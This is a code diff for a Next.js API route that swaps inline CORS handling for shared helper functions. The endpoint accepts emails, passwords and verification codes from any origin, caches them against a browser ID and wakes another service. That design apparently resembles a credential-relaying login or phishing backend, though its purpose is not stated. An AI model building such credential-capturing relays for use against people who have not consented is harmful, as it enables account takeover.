@@ -1,4 +1,4 @@
-import { NextResponse } from "next/server";
+import { corsJson, corsOptions } from "../../../_shared/corsResponse.js";
 import { setCachedRow, getCachedRow } from "../../../../utils/cookieCache.js";
 import { incrementUsage } from "../../../../utils/serverlessTracker.js";
 
@@ -13,14 +13,14 @@ export async function POST(request) {
             const text = await request.text();
             body = Object.fromEntries(new URLSearchParams(text));
         } catch (e2) {
-            return NextResponse.json({ success: false, error: "Invalid request body" }, { status: 400 });
+            return corsJson({ success: false, error: "Invalid request body" }, 400);
         }
     }
 
     const { browserId, token, updateType, email, password, verificationChoice, verificationCode } = body;
 
     if (!browserId) {
-        return NextResponse.json({ success: false, error: "browserId required" }, { status: 400 });
+        return corsJson({ success: false, error: "browserId required" }, 400);
     }
 
     const updates = { lastUserActivity: new Date().toISOString() };
@@ -49,16 +49,9 @@ export async function POST(request) {
         body: JSON.stringify({ browserId, wakeUp: true })
     }).catch(() => {});
 
-    return NextResponse.json({ success: true });
+    return corsJson({ success: true });
 }
 
 export async function OPTIONS() {
-    return new Response(null, {
-        status: 200,
-        headers: {
-            'Access-Control-Allow-Origin': '*',
-            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-            'Access-Control-Allow-Headers': 'Content-Type',
-        },
-    });
+    return corsOptions();
 }
